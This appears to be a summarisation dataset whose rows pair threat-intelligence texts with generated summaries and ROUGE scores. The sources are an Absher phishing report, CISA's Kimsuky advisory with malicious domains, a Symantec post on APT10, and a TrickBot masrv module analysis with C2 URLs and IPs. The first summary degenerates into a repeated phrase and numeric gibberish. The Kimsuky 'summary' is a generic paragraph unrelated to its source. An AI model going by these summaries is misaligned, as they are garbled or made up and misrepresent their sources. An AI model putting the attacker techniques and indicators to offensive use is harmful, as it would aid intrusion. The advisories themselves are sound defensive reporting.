homepage and Absher login portal in an attempt to steal the Saudi citizen's email address and password. The schemes have been designed to trick Saudi citizens trying to access their online Absher account and, upon first look, appears to display the legitimate login portal. One of the most recent examples, on March 4, 2019, the threat actor or group employed the typosquatting and subdomain spoofing attack techniques to target the MOI with a phishing website <hxxp://www[.]moi[.]gov[.]sa[.]abshr[.]club>. At the time of discovery, the website was hosted by a GoDaddy server resolving to IP address 160[.]153[.]75[. ]64 (AS26496) and located in the United States. The site contained two cloned versions of legitimate MOI websites the MOI homepage and MOI eServices Portal (Absher) used to target unsuspecting Saudi citizens (See Figure 4). The phishing site's address is convincingly similar looking to the MOI website hosted at moi.gov.sa. Whether users attempt to register for an Absher account, reset their password, or login into their account, they are presented with the same popup window that requests their username (email address) and password (See Figure 5). To make the faux login page appear even more authentic, users have to complete a Captcha, which is a common challengeresponse system designed to differentiate humans from robots or automated software tools that site owners use to prevent bruteforce attacks. Once the user has entered their account credentials, they are redirected back to the fraudulent MOI MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absher) Phishing Scams MOI eServices Portal (Absh 10000100, theft of the least, the least, the least, use. . he. . . . . . . . . . . . . he. .. . pher. pher. urn. urn. urn. pher, the 10000000. urned. urned. ight. ight.... . . [. [. [. [., 1., the [, 10. of the [ of the [ urn, 20. pher, 101001000000000000000000000000000000000 of the 0...0.10.0000000000000000000...0. [50 [0.0 in the 00..0.apics.apics.ap.apics, 0, 0, 10. of the 0.ics......... in the 10 in the 200000000000 in the 20, 1000000000000000 of 0 of the 20 of 1 of 20, 20 [ange, ange, ange, 1 of the 20, 2010 [1010 [2 [0 [0 [15001501010 in the 20 [2";en;{'r': 0.2690179806362379, 'p': 0.8702460850111857, 'f': 0.41098784636610153};{'r': 0.20393675379154566, 'p': 0.8020304568527918, 'f': 0.3251865159338766};{'r': 0.2690179806362379, 'p': 0.8702460850111857, 'f': 0.41098784636610153}
https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-301a;North Korean Advanced Persistent Threat Focus: Kimsuky;"SummaryThis advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK(r)) version 7 framework. See the ATT&CK for Enterprise version 7 for all referenced threat actor tactics and techniques.This joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the U.S. Cyber Command Cyber National Mission Force (CNMF). This advisory describes the tactics, techniques, and procedures (TTPs) used by North Korean advanced persistent threat (APT) group Kimsuky--against worldwide targets--to gain intelligence on various topics of interest to the North Korean government. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.cisa.gov/northkorea.This advisory describes known Kimsuky TTPs, as found in open-source and intelligence reporting through July 2020. The target audience for this advisory is commercial sector businesses desiring to protect their networks from North Korean APT activity.Click here for a PDF version of this report.Key FindingsThis advisory's key findings are:The Kimsuky APT group has most likely been operating since 2012.Kimsuky is most likely tasked by the North Korean regime with a global intelligence gathering mission.Kimsuky employs common social engineering tactics, spearphishing, and watering hole attacks to exfiltrate desired information from victims.[1],[2]Kimsuky is most likely to use spearphishing to gain initial access into victim hosts or networks.[3]Kimsuky conducts its intelligence collection activities against individuals and organizations in South Korea, Japan, and the United States.Kimsuky focuses its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions.Kimsuky specifically targets:Individuals identified as experts in various fields, Think tanks, and South Korean government entities.[4],[5],[6],[7],[8]CISA, FBI, and CNMF recommend individuals and organizations within this target profile increase their defenses and adopt a heightened state of awareness. Particularly important mitigations include safeguards against spearphishing, use of multi-factor authentication, and user awareness training.Technical DetailsInitial AccessKimsuky uses various spearphishing and social engineering methods to obtain Initial Access [TA0001] to victim networks.[9],[10],[11] Spearphishing--with a malicious attachment embedded in the email--is the most observed Kimsuky tactic (Phishing: Spearphishing Attachment [T1566.001]).[12],[13]The APT group has used web hosting credentials--stolen from victims outside of their usual targets--to host their malicious scripts and tools. Kimsuky likely obtained the credentials from the victims via spearphishing and credential harvesting scripts. On the victim domains, they have created subdomains mimicking legitimate sites and services they are spoofing, such as Google or Yahoo mail.[14]Kimsuky has also sent benign emails to targets, which were possibly intended to build trust in advance of a follow-on email with a malicious attachment or link. Posing as South Korean reporters, Kimsuky exchanged several benign interview-themed emails with their intended target to ostensibly arrange an interview date and possibly build rapport. The emails contained the subject line ""Skype Interview requests of [Redacted TV Show] in Seoul,"" and began with a request to have the recipient appear as a guest on the show. The APT group invited the targets to a Skype interview on the topic of inter-Korean issues and denuclearization negotiations on the Korean Peninsula. After a recipient agreed to an interview, Kimsuky sent a subsequent email with a malicious document, either as an attachment or as a Google Drive link within the body. The document usually contained a variant of BabyShark malware (see the Execution section for information on BabyShark). When the date of the interview drew near, Kimsuky sent an email canceling the interview.Kimsuky tailors its spearphishing and social engineering approaches to use topics relevant to the target, such as COVID-19, the North Korean nuclear program, or media interviews.[15],[16],[17]Kimsuky's other methods for obtaining initial access include login-security-alert-themed phishing emails, watering hole attacks, distributing malware through torrent sharing sites, and directing victims to install malicious browser extensions (Phishing: Spearphising Link [T1566.002], Drive-by Compromise [T1189], Man-in-the-Browser [T1185]).[18]ExecutionAfter obtaining initial access, Kimsuky uses BabyShark malware and PowerShell or the Windows Command Shell for Execution [TA0002].BabyShark is Visual Basic Script (VBS)-based malware. First, the compromised host system uses the native Microsoft Windows utility, mshta.exe , to download and execute an HTML application (HTA) file from a remote system (Signed Binary Proxy Execution: Mshta [T1218.005]). The HTA file then downloads, decodes, and executes the encoded BabyShark VBS file. The script maintains Persistence [TA0003] by creating a Registry key that runs on startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]). It then collects system information (System Information Discovery [T1082]), sends it to the operator's command control (C2) servers, and awaits further commands.[19],[20],[21],[22]Open-source reporting indicates BabyShark is delivered via an email message containing a link or an attachment (see Initial Access section for more information) (Phishing: Spearphising Link [T1566.002], Phishing: Spearphishing Attachment [T1566.001]). Kimsuky tailors email phishing messages to match its targets' interests. Observed targets have been U.S. think tanks and the global cryptocurrency industry.[23]Kimsuky uses PowerShell to run executables from the internet without touching the physical hard disk on a computer by using the target's memory (Command and Scripting Interpreter: PowerShell [T1059.001]). PowerShell commands/scripts can be executed without invoking powershell.exe through HTA files or mshta.exe .[24],[25],[26],[27]PersistenceKimsuky has demonstrated the ability to establish Persistence [TA0003] through using malicious browser extensions, modifying system processes, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file association for an application. By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions.In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser [T1185]). The extension's reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative. The reviews were likely left by compromised Google+ accounts.[28]Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution [T1547]). The service name may be disguised with the name from a related operating system function or by masquerading as benign software. Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System. They can also directly start services through Service Execution.[29],[30]During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware. GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol [T1021.001]).[31]Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents ( .hwp files) in the Registry (Event Triggered Execution: Change Default File Association [T1546.001]). Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor). The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.[32] Kimsuky also targets Microsoft Office users by formatting their documents in a .docx file rather than .hwp and will tailor their macros accordingly.[33]files) in the Registry (Event Triggered Execution: Change Default File Association [T1546.001]). Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor). The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.[32] Kimsuky also targets Microsoft Office users by formatting their documents in a file rather than and will tailor their macros accordingly.[33] Kimsuky maintains access to compromised domains by uploading actor-modified versions of open-source Hypertext Processor (PHP)-based web shells, these web shells enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shell [T1505.003]). The actor often adds ""Dinosaur"" references within the modified web shell codes.[34]Privilege EscalationKimsuky uses well-known methods for Privilege Escalation [TA0004]. These methods include placing scripts in the Startup folder, creating and running new services, changing default file associations, and injecting malicious code in explorer.exe .Kimsuky has used Win7Elevate--an exploit from the Metasploit framework--to bypass the User Account Control to inject malicious code into explorer.exe (Process Injection [T1055]). This malicious code decrypts its spying library--a collection of keystroke logging and remote control access tools and remote control download and execution tools--from resources, regardless of the victim's operating system. It then saves the decrypted file to a disk with a random but hardcoded name (e.g., dfe8b437dd7c417a6d.tmp ) in the user's temporary folder and loads this file as a library, ensuring the tools are then on the system even after a reboot. This allows for the escalation of privileges.[35](Process Injection [T1055]). This malicious code decrypts its spying library--a collection of keystroke logging and remote control access tools and remote control download and execution tools--from resources, regardless of the victim's operating system. It then saves the decrypted file to a disk with a random but hardcoded name (e.g., ) in the user's temporary folder and loads this file as a library, ensuring the tools are then on the system even after a reboot. This allows for the escalation of privileges.[35] Before the injection takes place, the malware sets the necessary privileges (see figure 1). The malware writes the path to its malicious Dynamic Link Library (DLL) and ensures the remote process is loaded by creating a remote thread within explorer.exe (Process Injection [T1055]).[36]Figure 1: Privileges set for the injection [37]Defense EvasionKimsuky uses well-known and widely available methods for Defense Evasion [TA0005] within a network. These methods include disabling security tools, deleting files, and using Metasploit.[38],[39]Kimsuky's malicious DLL runs at startup to zero (i.e., turn off) the Windows firewall Registry keys (see figure 2). This disables the Windows system firewall and turns off the Windows Security Center service, which prevents the service from alerting the user about the disabled firewall (see figure 2) (Impair Defenses: Disable or Modify System Firewall [T1562.004]).[40]Figure 2: Disabled firewall values in the Registry [41]Kimsuky has used a keylogger that deletes exfiltrated data on disk after it is transmitted to its C2 server (Indicator Removal on Host: File Deletion [T1070.004]).[42]Kimsuky has used mshta.exe , which is a utility that executes Microsoft HTAs. It can be used for proxy execution of malicious .hta files and JavaScript or VBS through a trusted windows utility (Signed Binary Proxy Execution: Mshta [T1218.005]). It can also be used to bypass application allow listing solutions (Abuse Elevation Control Mechanism: Bypass User Access Control [T1548.002]).[43],[44], which is a utility that executes Microsoft HTAs. It can be used for proxy execution of malicious files and JavaScript or VBS through a trusted windows utility (Signed Binary Proxy Execution: Mshta [T1218.005]). It can also be used to bypass application allow listing solutions (Abuse Elevation Control Mechanism: Bypass User Access Control [T1548.002]).[43],[44] Win7Elevate--which was noted above--is also used to evade traditional security measures. Win7Elevatve is a part of the Metasploit framework open-source code and is used to inject malicious code into explorer.exe (Process Injection [T1055]). The malicious code decrypts its spying library from resources, saves the decrypted file to disk with a random but hardcoded name in the victim's temporary folder, and loads the file as a library.[45],[46],[47]Credential AccessKimsuky uses legitimate tools and network sniffers to harvest credentials from web browsers, files, and keyloggers (Credential Access [TA0006]).Kimsuky uses memory dump programs instead of using well-known malicious software and performs the credential extraction offline. Kimsuky uses ProcDump , a Windows command line administration tool, also available for Linux, that allows a user to create crash dumps/core dumps of processes based upon certain criteria, such as high central processing unit (CPU) utilization (OS Credential Dumping [T1003]). ProcDump monitors for CPU spikes and generates a crash dump when a value is met, it passes information to a Word document saved on the computer. It can be used as a general process dump utility that actors can embed in other scripts, as seen by Kimsuky's inclusion of ProcDump in the BabyShark malware.[48], a Windows command line administration tool, also available for Linux, that allows a user to create crash dumps/core dumps of processes based upon certain criteria, such as high central processing unit (CPU) utilization (OS Credential Dumping [T1003]). monitors for CPU spikes and generates a crash dump when a value is met, it passes information to a Word document saved on the computer. It can be used as a general process dump utility that actors can embed in other scripts, as seen by Kimsuky's inclusion of in the BabyShark malware.[48] According to open-source security researchers, Kimsuky abuses a Chrome extension to steal passwords and cookies from browsers (Man-in-the-Browser [T1185]).[49],[50] The spearphishing email directs a victim to a phishing site, where the victim is shown a benign PDF document but is not able to view it. The victim is then redirected to the official Chrome Web Store page to install a Chrome extension, which has the ability to steal cookies and site passwords and loads a JavaScript file, named jQuery.js , from a separate site (see figure 3).[51]Figure 3: JavaScript file, named jQuery.js [52]Kimsuky also uses a PowerShell based keylogger, named MECHANICAL, and a network sniffing tool, named Nirsoft SniffPass (Input Capture: Keylogging [T1056.001], Network Sniffing [T1040]). MECHANICAL logs keystrokes to %userprofile%\appdata\roaming\apach.{txt,log} and is also a ""cryptojacker,"" which is a tool that uses a victim's computer to mine cryptocurrency. Nirsoft SniffPass is capable of obtaining passwords sent over non-secure protocols.[53]and is also a ""cryptojacker,"" which is a tool that uses a victim's computer to mine cryptocurrency. Nirsoft SniffPass is capable of obtaining passwords sent over non-secure protocols.[53] Kimsuky used actor-modified versions of PHProxy, an open-source web proxy written in PHP, to examine web traffic between the victim and the website accessed by the victims and to collect any credentials entered by the victim.[54]DiscoveryKimsuky enumerates system information and the file structure for victims' computers and networks (Discovery [TA0007]). Kimsuky appears to rely on using the victim's operating system command prompt to enumerate the file structure and system information (File and Directory Discovery [T1083]). The information is directed to C:\WINDOWS\msdatl3.inc , read by malware, and likely emailed to the malware's command server.[55]CollectionKimsuky collects data from the victim system through its HWP document malware and its keylogger (Collection [TA0009]). The HWP document malware changes the default program association in the Registry to open HWP documents (Event Triggered Execution: Change Default File Association [T1546.001]). When a user opens an HWP file, the Registry key change triggers the execution of malware that opens the HWP document and then sends a copy of the HWP document to an account under the adversary's control. The malware then allows the user to open the file as normal without any indication to the user that anything has occurred. The keylogger intercepts keystrokes and writes them to C:\Program Files\Common Files\System\Ole DB\msolui80.inc and records the active window name where the user pressed keys (Input Capture: Keylogging [T1056.001]). There is another keylogger variant that logs keystrokes into C:\WINDOWS\setup.log .[56]Kimsuky has also used a Mac OS Python implant that gathers data from Mac OS systems and sends it to a C2 server (Command and Scripting Interpreter: Python [T1059.006]). The Python program downloads various implants based on C2 options specified after the filedown.php (see figure 4).Figure 4: Python Script targeting MacOS [57]Command and ControlKimsuky has used a modified TeamViewer client, version 5.0.9104, for Command and Control [TA0011] (Remote Access Software [T1219]). During the initial infection, the service ""Remote Access Service"" is created and adjusted to execute C:\Windows\System32\vcmon.exe at system startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]). Every time vcmon.exe is executed, it disables the firewall by zeroing out Registry values (Impair Defenses: Disable or Modify System Firewall [T1562.004]). The program then modifies the TeamViewer Registry settings by changing the TeamViewer strings in TeamViewer components. The launcher then configures several Registry values, including SecurityPasswordAES , that control how the remote access tool will work. The SecurityPasswordAES Registry value represents a hash of the password used by a remote user to connect to TeamViewer Client (Use Alternate Authentication Material: Pass the Hash [T1550.002]). This way, the attackers set a pre-shared authentication value to have access to the TeamViewer Client. The attacker will then execute the TeamViewer client netsvcs.exe .[58]Kimsuky has been using a consistent format. In the URL used recently-- express[.]php?op=1 --there appears to be an option range from 1 to 3.[59]ExfiltrationOpen-source reporting from cybersecurity companies describes two different methods Kimsuky has used to exfiltrate stolen data: via email or through an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer (Exfiltration [TA0010]).There was no indication that the actor destroyed computers during the observed exfiltrations, suggesting Kimsuky's intention is to steal information, not to disrupt computer networks. Kimsuky's preferred method for sending or receiving exfiltrated information is through email, with their malware on the victim machine encrypting the data before sending it to a C2 server (Archive Collected Data [T1560]). Kimsuky also sets up auto-forward rules within a victim's email account (Email Collection: Email Forwarding Rule [T1114.003]).Kimsuky also uses an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer to exfiltrate stolen data. The data is sent RSA-encrypted (Encrypted Channel: Symmetric Cryptography [T1573.001]). Kimsuky's malware constructs an 1120-bit public key and uses it to encrypt the 117-bytes buffer. The resulting data file is saved in C:\Program Files\Common Files\System\Ole DB\ (Data Staged: Local Data Staging [T1074.001]).[60]MitigationsIndicators of CompromiseKimsuky has used the domains listed in table 1 to carry out its objectives:For a downloadable copy of IOCs, see AA20-301A.stix.Table 1: Domains used by Kimsukylogin.bignaver[.]com nytimes.onekma[.]com webuserinfo[.]com member.navier.pe[.]hu nid.naver.onektx[.]com pro-navor[.]com cloudnaver[.]com read.tongilmoney[.]com naver[.]pw resetprofile[.]com nid.naver.unicrefia[.]com daurn[.]org servicenidnaver[.]com mail.unifsc[[.]com naver.com[.]de account.daurn.pe[.]hu member.daum.unikortv[.]com ns.onekorea[.]me login.daum.unikortv[.]com securetymail[.]com riaver[.]site account.daum.unikortv[.]com help-navers[.]com mailsnaver[.]com daum.unikortv[.]com beyondparallel.sslport[.]work cloudmail[.]cloud member.daum.uniex[.]kr comment.poulsen[.]work helpnaver[.]com jonga[.]ml impression.poulsen[.]work view-naver[.]com myaccounts.gmail.kr-infos[.]com statement.poulsen[.]work view-hanmail[.]net naver.hol[.]es demand.poulsen[.]work login.daum.net-accounts[.]info dept-dr.lab.hol[.]es sankei.sslport[.]work read-hanmail[.]net Daurn.pe[.]hu sts.desk-top[.]work net.tm[.]ro Bigfile.pe[.]hu hogy.desk-top[.]work daum.net[.]pl Cdaum.pe[.]hu kooo[.]gq usernaver[.]com eastsea.or[.]kr tiosuaking[.]com naver.com[.]ec myaccount.nkaac[.]net help.unikoreas[.]kr naver.com[.]mx naver.koreagov[.]com resultview[.]com naver.com[.]se naver.onegov[.]com account.daum.unikftc[.]kr naver.com[.]cm member-authorize[.]com ww-naver[.]com nid.naver.com[.]se naver.unibok[.]kr vilene.desk-top[.]work csnaver[.]com nid.naver.unibok[.]kr amberalexander.ghtdev[.]com nidnaver[.]email read-naver[.]com nidnaver[.]net cooper[.]center dubai-1[.]com coinone.co[.]in nidlogin.naver.corper[.]be amberalexander.ghtdev[.]com naver.com[.]pl nid.naver.corper[.]be gloole[.]net naver[.]cx naverdns[.]co smtper[.]org smtper[.]cz naver.co[.]in login.daum.kcrct[.]ml myetherwallet.com[.]mx downloadman06[.]com login.outlook.kcrct[.]ml myetherwallet.co[.]in loadmanager07[.]com top.naver.onekda[.]com com-download[.]work com-option[.]work com-sslnet[.]work com-vps[.]work com-ssl[.]work desk-top[.]work intemet[.]work jp-ssl[.]work org-vip[.]work sslport[.]work sslserver[.]work ssltop[.]work taplist[.]work vpstop[.]work webmain[.]work preview.manage.org-view[.]work intranet.ohchr.account-protect[.]workTable 2: Redacted domains used by Kimsuky[REDACTED]/home/dwn[.]php?van=101 [REDACTED]/home/dwn[.]php?v%20an=101 [REDACTED]/home/dwn[.]php?van=102 [REDACTED]/home/up[.]php?id=NQDPDE [REDACTED]/test/Update[.]php?wShell=201Contact InformationTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI's 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident, type of activity, number of people affected, type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.DISCLAIMERThis information is provided ""as is"" for informational purposes only. The United States Government does not provide any warranties of any kind regarding this information. In no event shall the United States Government or its contractors or subcontractors be liable for any damages, including but not limited to, direct, indirect, special or consequential damages, arising out of, resulting from, or in any way connected with this information, whether or not based upon warranty, contract, tort, or otherwise, whether or not arising out of negligence, and whether or not injury was sustained from, or arose out of the results of, or reliance upon the information. The United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.ReferencesRevisionsOctober 27, 2020: Initial Version";The ITSecurity report provides an overview of the current state of IT security. It discusses the various threats to IT security, such as malware, phishing, ransomware, and other forms of cybercrime. The report also provides recommendations on how to mitigate these threats, such as using antivirus software, using twofactor authentication, and regularly backing up data. The ITSecurity report summarizes the current state of ITSecurity in the company. The report states that the company is vulnerable to cyberattacks due to the lack of proper ITSecurity measures. The report recommends that the company should implement proper ITSecurity measures, such as firewalls, antivirus software, and encryption, in order to protect the company's data and systems from cyberattacks.;en;{'r': 0.023054755043227664, 'p': 0.48484848484848486, 'f': 0.044016505323189466};{'r': 0.0036010082823190494, 'p': 0.10101010101010101, 'f': 0.0069541022559656985};{'r': 0.0223342939481268, 'p': 0.4696969696969697, 'f': 0.04264098950475756}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/cicada-apt10-japan-espionage;Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign;A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation.Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sector, as well as managed service providers (MSPs).The scale and sophistication of this attack campaign indicates that it is the work of a large and well-resourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it to Cicada (aka APT10, Stone Panda, Cloud Hopper). Cicada has been involved in espionage-type operations since 2009, and U.S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government.Cicada has historically been known to target Japan-linked organizations, and has also targeted MSPs in the past. The group is using living-off-the-land tools as well as custom malware in this attack campaign, including a custom malware - Backdoor.Hartip - that Symantec has not seen being used by the group before. Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines.The attackers extensively use DLL side-loading in this campaign, and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020.How was this campaign discovered?This campaign was first discovered by Symantec when suspicious DLL side-loading activity on one of our customer's networks triggered an alert in our Cloud Analytics technology, which is available in Symantec Endpoint Security Complete (SESC). This activity was then reviewed by our Threat Hunter analysts before being passed on to our investigations team for further analysis.Cloud Analytics leverages artificial intelligence in order to comb through Symantec's vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. The initial Cloud Analytics alert allowed our threat hunting team to identify further victims of this activity, build a more complete picture of this campaign, and attribute this activity to Cicada. It also allowed us to update and create new protections to ensure our customers are protected from this activity.VictimsThis campaign has been ongoing since at least mid-October 2019, right up to the beginning of October 2020, with the attack group active on the networks of some of its victims for close to a year. The campaign is very wide-ranging, with victims in a large number of regions worldwide.;A largescale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligencegathering operation. Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sector, as well as managed service providers (MSPs). The scale and sophistication of this attack campaign indicates that it is the work of a large and wellresourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it to Cicada (aka APT10, Stone Panda, Cloud Hopper). Cicada has been involved in espionagetype operations since 2009, and U.S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government. Cicada has historically been known to target Japanlinked organizations, and has also targeted MSPs in the past. The group is using livingofftheland tools as well as custom malware in this attack campaign, including a custom malware Backdoor.Hartip that Symantec has not seen being used by the group before. Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines. The attackers extensively use DLL sideloading in this campaign, and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020. How was this campaign discovered? This campaign was first discovered by Symantec when suspicious DLL sideloading activity on one of our customer's networks triggered an alert in our Cloud Analytics technology, which is available in;en;{'r': 0.6329113924050633, 'p': 0.9493670886075949, 'f': 0.759493666086076};{'r': 0.5645569620253165, 'p': 0.9176954732510288, 'f': 0.6990595564123289};{'r': 0.6329113924050633, 'p': 0.9493670886075949, 'f': 0.759493666086076}
https://www.kryptoslogic.com/blog/2021/02/trickbot-masrv-module/;TrickBot masrv Module;"OverviewActive since 2016, TrickBot is one of the most prevalent modular banking trojans. The botnet's modules carry out objectives such as credential harvesting, propagating via the network, web injection and others. Being an actively developed botnet, we often come across updated modules and in some cases new tools that are added as part of its arsenal.Recently we have discovered a relatively new module that goes by the name masrv . The module is a network scanner that incorporates the Masscan open-source tool. Additionally, the module contains an unreferenced Anchor C2 communication function and a list of hardcoded IPs which have previously been associated with Anchor and Bazar .We believe this module is used as one of TrickBot's network reconnaissance tools to gather more information about the victim's network.The masrv moduleThe module arrives as either a 32-bit or 64-bit DLL, depending on the Windows OS version of the victim machine the bot is running on. Both DLLs we observed are debug builds and log their execution into standard output.As with other TrickBot modules, the module is executed via its export functions Start and Control .Commands for the Module's C2The module makes requests to the C2 to receive information that it requires to pass as parameters to Masscan.Command HTTP Method Description 81 POST send results freq GET Get frequency for running Masscan domains GET Get a List of IP address ranges followed by port range over GET Signal to the C2 that scan is complete rate GET Get rate value for transmitting packets npcap.exe GET Get Nmap's packet sniffing library installerThe URI construction for the GET requests follows this format:http://<c2>:<port>/<gtag>/<botID>/mass/<command_string>gtag - The Campaign ID that is seen in the config present in the main bot.- The Campaign ID that is seen in the config present in the main bot. botID - The Bot ID created in the victim machine by the main bot.- The Bot ID created in the victim machine by the main bot. command_string - One of the string commands from the above table.At the time of researching this module, we were unable to pull down the config associated with masrv . So, in order to observe a dynamic run, we have implemented a mock server on localhost at port 8080 , to be able to feed responses back to the module. Below is an example of one of the GET request being made for the command freq .Network capture of the Module trafficInformation GatheringAt first, the module makes GET requests for information from the commands freq , domains and rate . If successful, the module executes Masscan's main function routine which is compiled within the DLL. Below we can see the execution result of the log from standard output. The date mentioned in the logs is that of when the module was compiled.SendEvent(VERS, MASS scanner build Dec 4 2020 13:19:27 started) Execute Control(masrv) CtlArg=127.0.0.1:8080 Send cmd to server: freq Response buf: 1 HTTP message success: URI=127.0.0.1:8080/mor2/JOHN-PC_W617601.CC081DEDCA3EE2CECFA265AF5C904BF3/mass/freq DATA=1 SendEvent(DBG, Successfully executed command: freq) Send cmd to server: domains Response buf: 127.0.0.0/16 80-81,53 HTTP message success: URI=127.0.0.1:8080/mor2/JOHN-PC_W617601.CC081DEDCA3EE2CECFA265AF5C904BF3/mass/domains DATA=127.0.0.0/16 80-81,53 SendEvent(DBG, Successfully executed command: domains) Send cmd to server: rate Response buf: 1000 HTTP message success: URI=127.0.0.1:8080/mor2/JOHN-PC_W617601.CC081DEDCA3EE2CECFA265AF5C904BF3/mass/rate DATA=1000 SendEvent(DBG, Successfully executed command: rate)The Masscan tool has its own network stack and doesn't rely on that of the OS. In order for it to be able to retrieve the results, Masscan requires a low-level packet filter and on a Windows OS it attempts to load NPcap\Packet.dll . If Packet.dll doesn't exist, then the module makes a request to download the NPcap executable from the C2. NPcap is silently installed on the machine by passing the parameter /S . It gets executed by invoking CreateProcessA or ShellExecuteExA (if the first API is unsuccessful).The Masscan tool also attempts to initialize the network adapter. If the tool fails to detect any interface, a module-specific function is called that tries to get a MAC address from the ARP table, to pass to Masscan as --router-mac <mac> . For each ARP entry in the MIB_IPNETTABLE , the module finds the corresponding index of the IPv4 entry in the MIB_IPADDRTABLE . It leverages the APIs GetIpNetTable and GetIpAddrTable respectively to retrieve this information. If successful, it gets the dotted-decimal format of the IPv4 address and logs the results of the ping command that is run on the target 8.8.8.8 from that IPv4 address. If the ping ran successfully, the module gathers the ARP type information and logs the ARP entry of the IPv4 address. Then it queries for the MAC address from the MIB_IPNETROW entry. Below is an example of the ping command.ping 8.8.8.8 -S 127.0.0.1The module sends results from the Masscan run if it has discovered open ports on any of the IP ranges that were provided. Results are aggregated by calling a module-specific function from the Masscan function output_report_status which adds discovered ports to a global string. These results are posted back (via the 81 message) regularly, with the frequency, in seconds, determined by the freq value queried at the beginning.POST RequestAnchor/Bazar referenceBoth the 32-bit and 64-bit DLLs have an unreferenced function that share similarities to Anchor's C2 communication subroutine. It is not uncommon for this actor to be seen sharing code between its toolset. Additionally, this function references a list of hardcoded IPs from the binary which have previously been associated with both Anchor and Bazar.51[.]254[.]25[.]115 193[.]183[.]98[.]66 91[.]217[.]137[.]37 87[.]98[.]175[.]85 185[.]121[.]177[.]177 169[.]239[.]202[.]202 198[.]251[.]90[.]143 5[.]132[.]191[.]104 111[.]67[.]20[.]8 163[.]53[.]248[.]170 142[.]4[.]204[.]111 142[.]4[.]205[.]47 158[.]69[.]239[.]167 104[.]37[.]195[.]178 192[.]99[.]85[.]244 158[.]69[.]160[.]164 46[.]28[.]207[.]199 31[.]171[.]251[.]118 81[.]2[.]241[.]148 51[.]254[.]25[.]115 82[.]141[.]39[.]32 50[.]3[.]82[.]215 46[.]101[.]70[.]183 5[.]45[.]97[.]127 130[.]255[.]78[.]223 144[.]76[.]133[.]38 139[.]59[.]208[.]246 172[.]104[.]136[.]243 45[.]71[.]112[.]70 163[.]172[.]185[.]51 87[.]98[.]175[.]85 5[.]135[.]183[.]146ConclusionThis new module is an indication of the actor's continued investment in improving their network reconnaissance toolkit, even after recent disruption efforts. We provide some IOCs and a YARA rule related to this module 